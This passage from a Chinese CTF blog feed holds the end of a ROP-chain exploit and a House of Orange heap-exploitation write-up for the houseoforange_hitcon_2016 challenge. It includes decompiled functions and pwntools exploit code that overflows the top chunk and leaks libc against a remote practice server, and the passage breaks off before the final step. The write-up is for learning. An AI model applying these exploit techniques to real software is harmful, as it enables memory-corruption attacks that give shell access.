class="hljs-comment">#write(1,flag_addr,0x40)</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(1)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(flag_addr)<br>ROP_chain += p64(pop_rdx_ret)<br>ROP_chain += p64(0x40)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'write'</span>])<br><br><span class="hljs-built_in">add</span>(4,4,ROP_chain)<br><br><span class="hljs-comment">#dbg()</span><br><br>leave_ret = libc_base + 0x0000000000058373<br>ru(<span class="hljs-string">'Your input: '</span>)<br>sl(<span class="hljs-string">'666'</span>)<br>ru(<span class="hljs-string">'What do you want to say?'</span>)<br><span class="hljs-comment">#栈迁移</span><br>sl(<span class="hljs-string">'A'</span><span class="hljs-number">*0</span>x80 + p64(file_name_addr) + p64(leave_ret))<br><br><span class="hljs-comment">#dbg()</span><br>itr()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin&lt;/strong</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>House of Orange</title>
    <link href="https://kylinxin.github.io/2023/04/10/House%20of%20Orange/"/>
    <id>https://kylinxin.github.io/2023/04/10/House%20of%20Orange/</id>
    <published>2023-04-10T15:14:29.000Z</published>
    <updated>2023-09-12T09:16:37.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>题目中不存在 free 函数或其他释放堆块的函数。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1.</span>篡改top chunk size（注意size需要对齐内存页）<br><span class="hljs-number">2.</span>分配比top chunk size大的chunk。<br><span class="hljs-number">3.</span>现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。<br></code></pre></td></tr></tbody></table></figure><h3 id="注意：伪造top-chunk-size时，必须满足以下要求"><a href="#注意：伪造top-chunk-size时，必须满足以下要求" class="headerlink" title="注意：伪造top chunk size时，必须满足以下要求"></a>注意：伪造top chunk size时，必须满足以下要求</h3><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1.</span>伪造的size必须要对齐到内存页。<br><span class="hljs-number">2.</span>size要大于MINSIZE。<br><span class="hljs-number">3.</span>size要小于之后申请的chunk size + MINISIZE。<br><span class="hljs-number">4.</span>size的prev inuse位必须为<span class="hljs-number">1</span>。<br><span class="hljs-number">5.</span>malloc的大小不能大于mmap分配阈值。<br></code></pre></td></tr></tbody></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>保护全开，打开ida</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> choice; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">sub_1218</span>();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      <span class="hljs-built_in">menu</span>();<br>      choice = <span class="hljs-built_in">my_read</span>(a1, a2);<br>      <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">show</span>();<br>    }<br>    <span class="hljs-keyword">if</span> ( choice &gt; <span class="hljs-number">2</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">3</span> )<br>      {<br>        <span class="hljs-built_in">edit</span>();<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>        <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">4</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give up"</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        }<br>LABEL_13:<br>        a1 = <span class="hljs-string">"Invalid choice"</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( choice != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      <span class="hljs-built_in">add</span>();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs awk">int add()<br>{<br>  unsigned int size; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">8</span>h] [rbp-<span class="hljs-number">18</span>h]<br>  int color; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">14</span>h]<br>  _QWORD *v3; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">10</span>h] [rbp-<span class="hljs-number">10</span>h]<br>  _DWORD *v4; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">18</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  <span class="hljs-keyword">if</span> ( num2 &gt; <span class="hljs-number">3</span>u )                              <span class="hljs-regexp">//</span> num开始为<span class="hljs-number">0</span>，可利用add4次<br>  {<br>    puts(<span class="hljs-string">"Too many house"</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  v3 = malloc(<span class="hljs-number">0</span>x10uLL);   <span class="hljs-regexp">//</span>chunk_1<br>  printf(<span class="hljs-string">"Length of name :"</span>);<br>  size = my_read();<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0</span>x1000 )<br>    size = <span class="hljs-number">0</span>x1000;<br>  v3[<span class="hljs-number">1</span>] = malloc(size);     <span class="hljs-regexp">//</span>chunk_2<br>  <span class="hljs-keyword">if</span> ( !v3[<span class="hljs-number">1</span>] )<br>  {<br>    puts(<span class="hljs-string">"Malloc error !!!"</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  printf(<span class="hljs-string">"Name :"</span>);<br>  my_read2((void *)v3[<span class="hljs-number">1</span>], size);<br>  v4 = calloc(<span class="hljs-number">1</span>uLL, <span class="hljs-number">8</span>uLL);      <span class="hljs-regexp">//</span>chunk_3<br>  printf(<span class="hljs-string">"Price of Orange:"</span>);<br>  *v4 = my_read();<br>  ::color();<br>  printf(<span class="hljs-string">"Color of Orange:"</span>);<br>  color = my_read();<br>  <span class="hljs-keyword">if</span> ( color != <span class="hljs-number">0</span>xDDAA &amp;&amp; (color &lt;= <span class="hljs-number">0</span> || color &gt; <span class="hljs-number">7</span>) )<br>  {<br>    puts(<span class="hljs-string">"No such color"</span>);<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( color == <span class="hljs-number">0</span>xDDAA )<br>    v4[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>xDDAA;<br>  <span class="hljs-keyword">else</span><br>    v4[<span class="hljs-number">1</span>] = color + <span class="hljs-number">30</span>;<br>  *v3 = v4;<br>  heap_array = v3;<br>  ++num2;<br>  return puts(<span class="hljs-string">"Finish"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sub_EE6</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( !heap_array )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such house !"</span>);<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) == <span class="hljs-number">0xDDAA</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name of house : %s\n"</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)heap_array[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of orange : %d\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*heap_array);<br>    v0 = <span class="hljs-built_in">rand</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\x1B[01;38;5;214m%s\x1B[0m\n"</span>, *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;unk_203080 + v0 % <span class="hljs-number">8</span>));<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-keyword">if</span> ( *(<span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>) &lt;= <span class="hljs-number">30</span> || *(<span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>) &gt; <span class="hljs-number">37</span> )<br>    {<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Color corruption!"</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    }<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name of house : %s\n"</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)heap_array[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of orange : %d\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)*heap_array);<br>    v2 = <span class="hljs-built_in">rand</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\x1B[%dm%s\x1B[0m\n"</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(*heap_array + <span class="hljs-number">4LL</span>), *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;unk_203080 + v2 % <span class="hljs-number">8</span>));<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次</p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sub_107C</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  _DWORD *v1; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br><br>  <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">2u</span> )                               <span class="hljs-comment">// num开始为0，可利用edit3次</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You can't upgrade more"</span>);<br>  <span class="hljs-keyword">if</span> ( !heap_array )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such house !"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Length of name :"</span>);<br>  size = <span class="hljs-built_in">my_read</span>();<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x1000</span> )<br>    size = <span class="hljs-number">4096</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Name:"</span>);                              <span class="hljs-comment">// size由我们输入，存在溢出</span><br>  <span class="hljs-built_in">my_read2</span>((<span class="hljs-type">void</span> *)heap_array[<span class="hljs-number">1</span>], size);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Price of Orange: "</span>);<br>  v1 = (_DWORD *)*heap_array;<br>  *v1 = <span class="hljs-built_in">my_read</span>();<br>  <span class="hljs-built_in">color</span>();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Color of Orange: "</span>);<br>  v3 = <span class="hljs-built_in">my_read</span>();<br>  <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">0xDDAA</span> &amp;&amp; (v3 &lt;= <span class="hljs-number">0</span> || v3 &gt; <span class="hljs-number">7</span>) )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such color"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">0xDDAA</span> )<br>    *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) = <span class="hljs-number">0xDDAA</span>;<br>  <span class="hljs-keyword">else</span><br>    *(_DWORD *)(*heap_array + <span class="hljs-number">4LL</span>) = v3 + <span class="hljs-number">30</span>;<br>  ++num;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Finish"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先把前面的写好</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import  *<br> <br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <span class="hljs-comment">#小端序，linux系统，64位架构,debug</span><br> <br>binary = <span class="hljs-string">'./houseoforange_hitcon_2016'</span>  <br><span class="hljs-comment">#sh = process(binary) #连接本地程序</span><br>sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">26188</span>) <span class="hljs-comment">#连接远程程序</span><br>elf = <span class="hljs-variable constant_">ELF</span>(binary)     <br>libc = <span class="hljs-variable constant_">ELF</span>(<span class="hljs-string">'../../libc-2.23.so--64'</span>)  <br><br><span class="hljs-comment">#libc-2.23.so--64</span><br>one_gadget = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>one_gadget[<span class="hljs-number">0</span>] = <span class="hljs-number">0x45216</span><br>s       = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.send(data)<br>sa      = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendafter(delim, data)<br>sl      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:sh</span>.sendline(data)<br>sla     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:sh</span>.sendlineafter(delim, data)<br>r       = <span class="hljs-built_in">lambda</span> num=<span class="hljs-number">4096</span>           <span class="hljs-symbol">:sh</span>.recv(num)<br>ru      = <span class="hljs-built_in">lambda</span> delims  <span class="hljs-symbol">:sh</span>.recvuntil(delims )<br>itr     = <span class="hljs-built_in">lambda</span>                    <span class="hljs-symbol">:sh</span>.interactive()<br>uu32    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u32</span>(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u64</span>(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = <span class="hljs-built_in">lambda</span> name,addr          <span class="hljs-symbol">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg=<span class="hljs-built_in">lambda</span> address,<span class="hljs-symbol">data:</span>log.success(<span class="hljs-string">'%s: '</span><span class="hljs-string">%(address)</span>+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(sh)<br>        pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content, price=<span class="hljs-string">'2'</span>, color=<span class="hljs-string">'1'</span></span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name :"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    <span class="hljs-comment">#1-7</span><br>    sl(str(color))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, content, price=<span class="hljs-string">'2'</span>, color=<span class="hljs-string">'1'</span></span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name:"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    <span class="hljs-comment">#1-7</span><br>    sl(str(color))<br></code></pre></td></tr></tbody></table></figure><h3 id="修改top-chunk"><a href="#修改top-chunk" class="headerlink" title="修改top chunk"></a>修改top chunk</h3><p>随便申请一个chunk，然后利用edit函数，溢出修改topchunk</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">add<span class="hljs-comment">(0x30,'aaaa\n')</span><br>dbg<span class="hljs-comment">()</span><br>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">30</span> +p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x21)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">2</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0xf81)</span><br>edit<span class="hljs-comment">(len(payload)</span>, payload)<br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>top chunk大小为0x0000000000020f81<br>修改后的top chunk 大小为0x0000000000000f81<br class='item-img' data-src='https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="申请大于top-chunk的chunk，进入unsortedbin"><a href="#申请大于top-chunk的chunk，进入unsortedbin" class="headerlink" title="申请大于top chunk的chunk，进入unsortedbin"></a>申请大于top chunk的chunk，进入unsortedbin</h3><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x1000, <span class="hljs-string">'a\n'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="泄露libc和heap"><a href="#泄露libc和heap" class="headerlink" title="泄露libc和heap"></a>泄露libc和heap</h3><p>调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x400, <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)</span></span><br>libc<span class="hljs-selector-class">.address</span> = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x7f'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x3c5188<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc.address'</span>,libc.address)</span></span><br>io_list_all = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'_IO_list_all'</span>]</span><br>system = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'system'</span>]</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420" 